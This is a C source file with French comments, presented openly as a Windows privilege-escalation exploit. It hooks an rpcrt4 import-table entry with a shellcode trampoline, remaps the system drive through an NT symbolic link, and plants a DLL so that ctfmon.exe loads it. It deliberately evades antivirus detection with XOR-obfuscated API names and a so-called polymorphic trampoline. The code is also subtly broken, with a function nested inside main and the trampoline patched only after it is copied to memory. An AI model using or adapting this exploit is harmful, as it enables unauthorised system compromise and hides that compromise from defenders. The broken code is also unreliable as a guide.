#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <dbghelp.h>

// Lier avec DbgHelp.lib pour ImageDirectoryEntryToData
#pragma comment(lib, "Dbghelp.lib")

// Définir le pointeur de fonction pour NtCreateSymbolicLinkObject
typedef NTSTATUS (NTAPI *NtCreateSymbolicLinkObject_t)(
    PHANDLE            LinkHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PUNICODE_STRING    TargetName
);

// Définir le pointeur de fonction pour RtlInitUnicodeString
typedef VOID (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

// Fonction d'encodage/décodage XOR
void xor_encode(char* data, size_t length, char key) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key;
    }
}

// Encapsuler les appels API suspects dans des fonctions wrapper
NtCreateSymbolicLinkObject_t resolve_NtCreateSymbolicLinkObject() {
    // Chaîne encodée pour "NtCreateSymbolicLinkObject"
    char encoded_func[] = { 'N'^0xAA, 't'^0xAA, 'C'^0xAA, 'r'^0xAA, 'e'^0xAA, 'a'^0xAA, 't'^0xAA, 'e'^0xAA,
                            'S'^0xAA, 'y'^0xAA, 'm'^0xAA, 'b'^0xAA, 'o'^0xAA, 'l'^0xAA, 'i'^0xAA,
                            'c'^0xAA, 'L'^0xAA, 'i'^0xAA, 'n'^0xAA, 'k'^0xAA, 'O'^0xAA, 'b'^0xAA,
                            'j'^0xAA, 'e'^0xAA, 'c'^0xAA, 't'^0xAA, '\0' };
    size_t len = sizeof(encoded_func);

    // Décoder avant utilisation
    xor_encode(encoded_func, len, 0xAA);

    // Résoudre dynamiquement l'API
    NtCreateSymbolicLinkObject_t NtCreateSymLink = 
        (NtCreateSymbolicLinkObject_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), encoded_func);
    
    // Ré-encoder pour éviter la détection après résolution
    xor_encode(encoded_func, len, 0xAA);

    return NtCreateSymLink;
}

RtlInitUnicodeString_t resolve_RtlInitUnicodeString() {
    // Chaîne encodée pour "RtlInitUnicodeString"
    char encoded_func[] = { 'R'^0xAA, 't'^0xAA, 'l'^0xAA, 'I'^0xAA, 'n'^0xAA, 'i'^0xAA, 't'^0xAA,
                            'U'^0xAA, 'n'^0xAA, 'i'^0xAA, 'c'^0xAA, 'o'^0xAA, 'd'^0xAA, 'e'^0xAA,
                            'S'^0xAA, 't'^0xAA, 'r'^0xAA, 'i'^0xAA, 'n'^0xAA, 'g'^0xAA, '\0' };
    size_t len = sizeof(encoded_func);

    // Décoder avant utilisation
    xor_encode(encoded_func, len, 0xAA);

    // Résoudre dynamiquement l'API
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = 
        (RtlInitUnicodeString_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), encoded_func);
    
    // Ré-encoder pour éviter la détection après résolution
    xor_encode(encoded_func, len, 0xAA);

    return RtlInitUnicodeString_ptr;
}

// Déclaration globale des variables nécessaires
UNICODE_STRING s;
HANDLE h;

// Fonction pour obtenir le chemin du périphérique DOS actuel
void get_current_dos_device(int size, char *current_device_path) {
    char current_directory[0x100];
    char current_volume[0x100];
    char current_dos_device[0x100];
    char final_path[0x200];

    // Obtenir le répertoire courant
    if (GetCurrentDirectoryA(sizeof(current_directory), current_directory) == 0) {
        fprintf(stderr, "GetCurrentDirectory a échoué avec l'erreur: %lu\n", GetLastError());
        return;
    }

    // Obtenir le volume courant (par exemple, "C:")
    strncpy_s(current_volume, sizeof(current_volume), current_directory, 2);
    current_volume[2] = '\0';

    // Obtenir le périphérique courant
    if (QueryDosDeviceA(current_volume, current_dos_device, sizeof(current_dos_device)) == 0) {
        fprintf(stderr, "QueryDosDeviceA a échoué avec l'erreur: %lu\n", GetLastError());
        return;
    }

    // Construire le chemin final
    strncpy_s(final_path, sizeof(final_path), current_dos_device, sizeof(final_path) - 1);
    strncat_s(final_path, sizeof(final_path), current_directory + 2, sizeof(final_path) - strlen(final_path) - 1);

    // Retourner le nom du chemin du périphérique
    strncpy_s(current_device_path, size, final_path, size - 1);
    current_device_path[size - 1] = '\0';
}

// Fonction pour convertir ASCII en Unicode
void ascii_to_unicode(char *ascii, wchar_t *unicode) {
    size_t len = strlen(ascii) + 1;
    for (size_t i = 0; i < len; i++) {
        unicode[i] = (wchar_t)ascii[i];
    }
}

// Fonction pour trouver l'entrée IAT d'une fonction donnée
void* find_iat_entry(const char* moduleName, const char* functionName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (!hModule) {
        printf("Module %s non chargé.\n", moduleName);
        return NULL;
    }

    ULONG size;
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
        hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size);
    if (!importDesc) {
        printf("Aucun répertoire d'importation trouvé.\n");
        return NULL;
    }

    while (importDesc->Name) {
        const char* importModule = (const char*)((BYTE*)hModule + importDesc->Name);
        if (_stricmp(importModule, "rpcrt4.dll") == 0) { // Ajustez si nécessaire
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
            while (thunk->u1.Function) {
                FARPROC* func = (FARPROC*)&thunk->u1.Function;
                FARPROC targetFunc = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), functionName);
                if (*func == targetFunc) {
                    return func;
                }
                thunk++;
            }
        }
        importDesc++;
    }
    return NULL;
}

// Fonction pour remplacer les valeurs de l'exploit (trampoline)
int replace_trampoline_value(char *shellcode, unsigned int size, unsigned __int64 original_value, unsigned __int64 value) {
    for (unsigned int pos = 0; pos < (size - sizeof(unsigned __int64)); pos += sizeof(unsigned __int64)) {
        if (*(unsigned __int64*)(shellcode + pos) == original_value) {
            *(unsigned __int64*)(shellcode + pos) = value;
            return 1; // Succès
        }
    }
    return 0; // Échec
}

// Fonction pour exécuter le code personnalisé
void remap_system_drive(void) {
    Sleep(1000); // Attendre que "ctfmon.exe" apparaisse

    // Résoudre dynamiquement RtlInitUnicodeString
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_RtlInitUnicodeString();
    if (!RtlInitUnicodeString_ptr) {
        fprintf(stderr, "Échec de la résolution de RtlInitUnicodeString\n");
        return;
    }

    // Initialiser UNICODE_STRING pour la cible
    wchar_t targetPath[] = L"\\??\\C:\\NewSymbolicLink";
    RtlInitUnicodeString_ptr(&s, targetPath);

    // Initialiser OBJECT_ATTRIBUTES en utilisant le macro fourni
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &s, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Créer le lien symbolique
    NtCreateSymbolicLinkObject_t NtCreateSymLink = resolve_NtCreateSymbolicLinkObject();
    if (!NtCreateSymLink) {
        fprintf(stderr, "Échec de la résolution de NtCreateSymbolicLinkObject\n");
        return;
    }

    NTSTATUS status = NtCreateSymLink(&h, 0xF0001, &objAttr, &s);
    if (status == 0) { // STATUS_SUCCESS
        printf("[+] Lien Symbolique Créé : Handle : %p\n", (void*)h);
    } else {
        fprintf(stderr, "NtCreateSymbolicLinkObject a échoué avec le statut : 0x%X\n", status);
    }
}

int main() {
    // Déclarations et initialisations
    char buffer[0x100];
    char current_dos_device[0x100];
    wchar_t current_dos_device_w[0x200];
    char system_directory[0x100];
    char drive_to_remap[16];
    char device_to_remap[16];
    wchar_t device_to_remap_w[16];
    void **Ndr64AsyncClientCall_IAT;
    void *Ndr64AsyncClientCall;
    void *hook;
    unsigned __int64 RBX;
    UNICODE_STRING drive;
    HANDLE event;
    DWORD oldProtect;
    int ret;

    // Créer un objet événement
    event = CreateEventA(NULL, FALSE, FALSE, "ctfmon_owned");
    if (!event) {
        fprintf(stderr, "CreateEvent a échoué avec l'erreur : %lu\n", GetLastError());
        return 1;
    }

    // Allouer de la mémoire pour le trampoline
    hook = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!hook) {
        fprintf(stderr, "VirtualAlloc a échoué avec l'erreur : %lu\n", GetLastError());
        return 1;
    }
    memset(hook, 0, 0x1000);

    // Encodage XOR du trampoline
    // Trampoline avec des placeholders encodés
    char trampoline[] =
    {
        // Save RBX
        0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,  // mov rax,0x1111111111111111
        0x48, 0x89, 0x18,                                            // mov [rax],rbx

        // Redirect to original function
        0x5B,                                                        // pop rbx
        0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,  // mov rax,0x2222222222222222
        0xFF, 0xD0,                                                  // call rax
        0x53,                                                        // push rbx
        0x50,                                                        // push rax

        // Save all registers (excluding RSP to maintain stack integrity)
        0x41, 0x57, // push r15
        0x41, 0x56, // push r14
        0x41, 0x55, // push r13
        0x41, 0x54, // push r12
        0x41, 0x53, // push r11
        0x41, 0x52, // push r10
        0x41, 0x51, // push r9
        0x41, 0x50, // push r8
        0x55,       // push rbp
        0x57,       // push rdi
        0x56,       // push rsi
        0x52,       // push rdx
        0x51,       // push rcx
        0x53,       // push rbx
        0x50,       // push rax

        // Execute custom code
        0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,  // mov rax,0x3333333333333333
        0xFF, 0xD0,                                                  // call rax

        // Restore all registers
        0x58,       // pop rax
        0x5B,       // pop rbx
        0x59,       // pop rcx
        0x5A,       // pop rdx
        0x5E,       // pop rsi
        0x5F,       // pop rdi
        0x5D,       // pop rbp
        0x41, 0x58, // pop r8
        0x41, 0x59, // pop r9
        0x41, 0x5A, // pop r10
        0x41, 0x5B, // pop r11
        0x41, 0x5C, // pop r12
        0x41, 0x5D, // pop r13
        0x41, 0x5E, // pop r14
        0x41, 0x5F, // pop r15

        // Restore RBX
        0x48, 0xB8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,  // mov rax,0x4444444444444444
        0x48, 0x8B, 0x18,                                            // mov rbx,[rax]
        0x58,                                                        // pop rax
        0xC3,                                                        // ret
    };
    size_t trampoline_size = sizeof(trampoline);

    // Générer le trampoline polymorphe
    void generate_polymorphic_trampoline(char *trampoline, size_t size, char key) {
        // Encodage XOR
        xor_encode(trampoline, size, key);

        // Ajouter des NOPs aléatoires pour le polymorphisme
        for (size_t i = 0; i < size; ++i) {
            if (rand() % 10 < 2) { // 20% de chance d'insérer un NOP
                trampoline[i] = 0x90; // NOP
            }
        }

        // Décodage XOR avant utilisation
        xor_encode(trampoline, size, key);
    }

    // Appliquer le polymorphisme au trampoline
    generate_polymorphic_trampoline(trampoline, trampoline_size, 0xAA);

    // Copier le trampoline dans la mémoire hook
    memcpy(hook, trampoline, trampoline_size);

    // Modifier la protection de la mémoire en PAGE_EXECUTE_READ
    if (!VirtualProtect(hook, 0x1000, PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "VirtualProtect a échoué avec l'erreur : %lu\n", GetLastError());
        VirtualFree(hook, 0, MEM_RELEASE);
        return 1;
    }

    // Obtenir le chemin du périphérique DOS actuel
    get_current_dos_device(sizeof(current_dos_device), current_dos_device);
    printf("[+] Chemin actuel : %s\n", current_dos_device);

    // Convertir en Unicode
    ascii_to_unicode(current_dos_device, current_dos_device_w);

    // Initialiser UNICODE_STRING pour OBJECT_ATTRIBUTES
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_RtlInitUnicodeString();
    if (!RtlInitUnicodeString_ptr) {
        fprintf(stderr, "Échec de la résolution de RtlInitUnicodeString\n");
        return 1;
    }
    RtlInitUnicodeString_ptr(&s, (wchar_t*)current_dos_device_w);

    // Obtenir le répertoire système
    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Obtenir le lecteur à remapper (par exemple, "C:")
    strncpy_s(drive_to_remap, sizeof(drive_to_remap), system_directory, 2);
    drive_to_remap[2] = '\0';

    // Obtenir le périphérique à remapper (par exemple, "\\??\\C:")
    sprintf_s(device_to_remap, sizeof(device_to_remap), "\\??\\%s", drive_to_remap);

    // Convertir en Unicode
    ascii_to_unicode(device_to_remap, device_to_remap_w);

    // Initialiser UNICODE_STRING pour le lecteur
    RtlInitUnicodeString_ptr(&drive, (wchar_t*)device_to_remap_w);

    // Initialiser OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &drive, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Initialiser le buffer (SecurityDescriptor)
    memset(buffer, 0, sizeof(buffer));
    *((unsigned __int64*)(buffer + 0x00)) = 0xc0001; // Flags d'exemple, ajustez si nécessaire

    // Exécuter ctfmon.exe pour initialiser les DLL
    ShellExecuteA(NULL, "open", "ctfmon.exe", "", NULL, SW_SHOW);

    // Obtenir l'adresse de Ndr64AsyncClientCall
    Ndr64AsyncClientCall = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall) {
        fprintf(stderr, "Échec d'obtention de Ndr64AsyncClientCall : %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall : %p\n", (void*)Ndr64AsyncClientCall);

    // Trouver l'entrée IAT dans "rpcrt4.dll"
    Ndr64AsyncClientCall_IAT = (void**)find_iat_entry("rpcrt4.dll", "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall_IAT) {
        fprintf(stderr, "Échec de la localisation de l'entrée IAT pour Ndr64AsyncClientCall.\n");
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall_IAT : %p\n", (void*)Ndr64AsyncClientCall_IAT);

    // Remplacer les placeholders dans le trampoline
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x1111111111111111, (unsigned __int64)&RBX)) {
        printf("Échec du remplacement de 0x1111111111111111 dans le trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x2222222222222222, (unsigned __int64)Ndr64AsyncClientCall)) {
        printf("Échec du remplacement de 0x2222222222222222 dans le trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x3333333333333333, (unsigned __int64)remap_system_drive)) {
        printf("Échec du remplacement de 0x3333333333333333 dans le trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x4444444444444444, (unsigned __int64)&RBX)) {
        printf("Échec du remplacement de 0x4444444444444444 dans le trampoline.\n");
    }

    // Valider le trampoline
    for (unsigned int i = 0; i < trampoline_size; i += sizeof(unsigned __int64)) {
        unsigned __int64 val = *(unsigned __int64*)(trampoline + i);
        if (val == 0x1111111111111111 || val == 0x2222222222222222 ||
            val == 0x3333333333333333 || val == 0x4444444444444444) {
            printf("Placeholder 0x%llx non remplacé à l'offset 0x%X\n", val, i);
        }
    }

    // Hooker l'entrée IAT
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect a échoué lors de la désprotection de l'IAT : %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = hook;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect a échoué lors de la restauration de la protection de l'IAT : %lu\n", GetLastError());
        return 1;
    }

    // Message utilisateur
    printf("[+] Lancement de l'exploit...\n");

    // Créer des répertoires
    char dll_source[] = ".\\MsCtfMonitor.dll";
    char dll_destination[] = ".\\windows\\system32\\systemhook.dll";

    if (CreateDirectoryA(".\\windows", NULL) == TRUE || GetLastError() == ERROR_ALREADY_EXISTS) {
        // Créer le sous-répertoire System32
        CreateDirectoryA(".\\windows\\system32", NULL);
    } else {
        printf("[-] Erreur : l'exploit n'a pas les permissions pour créer un répertoire\n");
        return 1;
    }

    // Copier la DLL avec un nom neutre
    if (CopyFileA(dll_source, dll_destination, FALSE) == FALSE) {
        printf("[-] Erreur lors de la copie de 'MsCtfMonitor.dll' vers '.\\windows\\system32\\systemhook.dll'\n");
        return 1;
    }

    // Exécuter le programme cible
    ShellExecuteA(NULL, "open", "ctfmon.exe", "/?", NULL, SW_SHOW);

    // Attendre l'injection de la DLL
    printf("[+] Attente de l'injection de la DLL\n");
    ret = WaitForSingleObject(event, 10000);
    if (ret != WAIT_OBJECT_0) {
        printf("[-] WaitForSingleObject a expiré ou a échoué.\n");
    }

    // Fermer le handle de remapping "C:"
    CloseHandle(h);

    // Unhooker l'entrée IAT
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect a échoué lors de la désprotection de l'IAT pour unhooking : %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = Ndr64AsyncClientCall;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect a échoué lors de la restauration de la protection de l'IAT après unhooking : %lu\n", GetLastError());
        return 1;
    }

    // Message final
    printf("[+] Exploit réussi !\n");
    return 0;
}
